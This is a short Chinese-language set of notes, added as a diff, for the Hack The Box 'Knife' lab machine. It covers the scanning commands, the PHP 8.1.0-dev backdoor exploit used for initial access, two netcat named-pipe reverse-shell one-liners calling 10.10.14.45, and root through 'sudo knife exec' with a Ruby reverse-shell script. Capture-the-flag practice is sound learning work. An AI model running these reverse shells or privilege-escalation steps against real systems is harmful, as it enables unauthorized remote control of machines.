@@ -1,0 +1,18 @@
+nmap -sV -sC -Pn 10.129.157.201 > nmap.txt
+nmap -p- 10.129.157.201 > nmapall.txt
+
+gobuster dir  -u http://10.129.157.201/  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x txt,php,cgi > gobuster.txt
+nikto -h http://10.129.158.103 > nikto.txt
+
+
+1.namp掃描到端口80
+2.nikto掃描發現php版本是8.1.0-dev,根據版本上網搜索漏洞
+3.使用49933可以直接取得reverse shell
+https://www.getkandg.com/2021/05/knife-htb-walkthrough-knife-htb-writeup.html
+4.取得reverse後在用nc套一層shell
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 4444 >/tmp/f
+5.查看sudo 有/usr/bin/knife的root權限,執行查看到有knife exec可以執行ruby腳本
+6.上網下載ruby的reverse script 後執行取得reverse shell
+sudo /usr/bin/knife exec /tmp/rev.rb
+7.取得reverse後 在套一層shell可正常
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 5555 >/tmp/f
